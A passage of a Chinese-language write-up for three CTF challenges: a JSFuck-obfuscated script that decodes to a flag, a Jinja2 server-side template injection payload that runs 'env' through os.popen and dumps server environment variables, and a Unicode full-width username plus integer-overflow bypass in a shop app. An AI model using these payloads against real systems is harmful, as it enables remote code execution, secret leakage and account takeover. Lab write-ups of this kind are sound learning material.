])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])
```

**分析**

- JSFuck可以直接放到console里执行

```shell
'Your flag is: PCTF{c66ceec6-5def-405d-9747-7fa2c8121ff5}'
```

#### 题目答案

**得到：PCTF{c66ceec6-5def-405d-9747-7fa2c8121ff5}**



### 复读机

#### 题目信息

> ## 复读机250 pts
>
> "人类与机器的本质区别是？ 机器会复读qwq 虽然有些人也会复读 "

#### 解题过程

**测试输入**

```shell
1
```

```shell
1
```

```shell
{{1+1}}
```

```shell
2
```

**分析**

- 存在ssti

**payload**

```shell
{{lipsum.__globals__.os.popen('env').read()}}
```

```shell
🦜
复读机
输入任何内容，我会原样复读给你！

请输入要复读的内容：
{{lipsum.__globals__.os.popen('env').read()}}
RUN
复读结果：
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
HOSTNAME=pctf2025-ec65d39f6d4b476e
SHLVL=1
HOME=/root
GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305
PYTHON_SHA256=5462f9099dfd30e238def83c71d91897d8caa5ff6ebc7a50f14d4802cdaaa79a
WERKZEUG_SERVER_FD=3
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
GZCTF_FLAG=PCTF{aff2238d-1649-40fb-9c47-811a766353f7}
KUBERNETES_PORT_443_TCP_PROTO=tcp
PYTHON_VERSION=3.13.7
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/app
GZCTF_TEAM_ID=3440
```

#### 题目答案

**得到：PCTF{aff2238d-1649-40fb-9c47-811a766353f7}**



### 神秘商店

#### 题目信息

> ## 神秘商店250 pts
>
> 体验一下rust的魅力吧！

#### 解题过程

**注册**

```shell
username：ａdmin
password：123456
```

**分析**

- 用全角a可绕过后端

```shell
4294967246 + 100 = 50
```

**分析**

- 登录后增加金额，通过整数溢出获得50金额

```shell
恭喜，你购买到了Flag: PCTF{9d830a2d-6d1f-4647-a2b1-735977b0e17b}admin
```

#### 题目答案

**得到：PCTF{9d830a2d-6d1f-4647-a2b1-735977b0e17b}**